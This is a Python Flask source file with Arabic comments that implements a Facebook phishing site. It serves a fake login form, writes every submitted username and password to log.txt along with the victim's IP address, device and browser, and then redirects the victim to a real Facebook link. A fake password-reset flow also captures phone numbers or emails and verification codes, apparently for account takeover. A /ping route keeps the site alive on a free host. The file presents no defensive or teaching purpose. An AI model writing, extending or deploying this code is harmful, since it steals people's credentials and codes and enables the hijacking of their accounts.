from flask import Flask, request, redirect, render_template
from datetime import datetime
from flask import send_from_directory, session
import os
print("""" +++++++++++++++++++++++++++++++++++++++++++++++++++
____________________________Server started__________________________
           +++++++++++++++++++++++++++++++++++++++++++++++++++""")
app = Flask(__name__)
def log_every_request():
    print(f"(REQUEST) {request.method} {request.path} from {request.remote_addr}")
app.secret_key = "secret123"

# مسار log.txt الصحيح (مهم جداً لـ Render)
log_path = os.path.join(os.path.dirname(__file__), "log.txt")

# ========================
# Favicon
# ========================
@app.route('/favicon.ico')
def favicon():
    return send_from_directory('static', 'favicon.ico')



#=========================
# Ping 
#=========================
@app.route("/ping")
def ping():
    print("===========(PING) UptimeRobot is visiting the server=============")
    return "OK" ,200

# ========================
# الصفحة الرئيسية
# ========================
@app.route("/")
def home():
    print("(DONE) User opened the homepage")
    result = render_template("FacebookForm.html")
    print("(DONE) User get (FacebookForm.html)")
    return result


# ========================
# كشف نوع الجهاز والمتصفح
# ========================
def detect_device(user_agent):
    ua = user_agent.lower()

    if "android" in ua or "iphone" in ua:
        device = "Mobile Phone"
    elif "ipad" in ua or "tablet" in ua:
        device = "Tablet"
    else:
        device = "Computer"

    if "windows" in ua:
        os_name = "Windows"
    elif "android" in ua:
        os_name = "Android"
    elif "iphone" in ua or "ios" in ua:
        os_name = "iOS"
    elif "mac" in ua:
        os_name = "MacOS"
    else:
        os_name = "Unknown"

    if "chrome" in ua:
        browser = "Chrome"
    elif "firefox" in ua:
        browser = "Firefox"
    elif "safari" in ua:
        browser = "Safari"
    else:
        browser = "Unknown"

    return device, os_name, browser


# ========================
# تسجيل الدخول
# ========================
@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    print(f"User tried to login with username : {username} and password : {password}")

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")
    referrer = request.headers.get("Referer", "Direct")

    device, os_name, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_data = f"""
Username/Email: {username}
Password: {password}
IP Address: {ip}
Device Type: {device}
Operating System: {os_name}
Browser: {browser}
User-Agent: {user_agent}
Referrer: {referrer}
Time: {time}
--------------------------------
"""

    with open(log_path, "a", encoding="utf-8", buffering=1) as file:
        file.write(log_data)

    login_botton_url = "https://www.facebook.com/share/r/14XdVmsrfeE/"
    print(f"(DONE) User entered url : {login_botton_url}")
    return redirect(login_botton_url)


# ========================
# إنشاء حساب
# ========================
@app.route("/create")
def create():
    print("User clicked on create new acount")
    create_url = "https://www.fhyi.com"
    print(f"User opened url : {create_url}")
    return redirect(create_url)


# ========================
# Forgot Password
# ========================
@app.route("/forgot")
def forgot():
    print("User opened forgot password page")
    result = render_template("forgot.html")
    print("(DONE) User get (forgot.html)")
    return result


# ========================
# verify
# ========================
@app.route("/verify", methods=["POST"])
def verify():

    phone_or_email = request.form.get("phone_or_email")

    # حفظ في session
    session["phone_or_email"] = phone_or_email

    print(f"User entered phone/email : {phone_or_email}")

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")

    device, os_name, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_data = f"""
Forgot Password Request
Phone/Email: {phone_or_email}

IP Address: {ip}
Device Type: {device}
Operating System: {os_name}
Browser: {browser}
User-Agent: {user_agent}

Time: {time}
--------------------------------
"""

    with open(log_path, "a", encoding="utf-8") as file:
        file.write(log_data)

    result = render_template("verify.html")
    print("(DONE) User get (verify.html)")
    return result


# ========================
# verify_code
# ========================
@app.route("/verify_code", methods=["POST"])
def verify_code():

    code = request.form.get("code")

    print(f"(DONE) User entered a verification code : {code}")

    phone_or_email = session.get("phone_or_email", "Unknown")

    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent", "Unknown")

    device, os_name, browser = detect_device(user_agent)
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_data = f"""
Verification Code

Phone/Email: {phone_or_email}
Code: {code}

IP Address: {ip}
Device Type: {device}
Operating System: {os_name}
Browser: {browser}
User-Agent: {user_agent}

Time: {time}
--------------------------------
"""

    with open(log_path, "a", encoding="utf-8") as file:
        file.write(log_data)

    print("(DONE) User get : (تم تسجيل الرمز بنجاح)")
    print("Everything is done")

    return "(DONE)", 200


# ========================
# تشغيل السيرفر
# ========================
if __name__ == "__main__":
    print("Server is running...")
    app.run()